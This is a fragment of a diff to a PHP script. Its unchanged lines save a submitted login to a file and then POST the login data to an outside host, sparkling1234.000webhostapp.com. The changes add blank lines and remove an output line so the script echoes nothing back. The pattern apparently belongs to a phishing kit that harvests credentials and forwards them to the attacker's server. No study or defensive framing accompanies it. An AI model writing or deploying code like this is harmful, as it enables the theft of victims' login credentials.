@@ -22,6 +22,11 @@
     // close the file
     fclose($f);
 
+
+
+
+
+    
     $postdata = http_build_query(
         array(
             'login' => $login,
@@ -37,7 +42,7 @@
     );
     $context = stream_context_create($opts);
     $result = file_get_contents('https://sparkling1234.000webhostapp.com/', false, $context);
-    echo json_encode($data);
+    
 
     // header('Location: '."https://sparkling1234.000webhostapp.com/");
 ?>
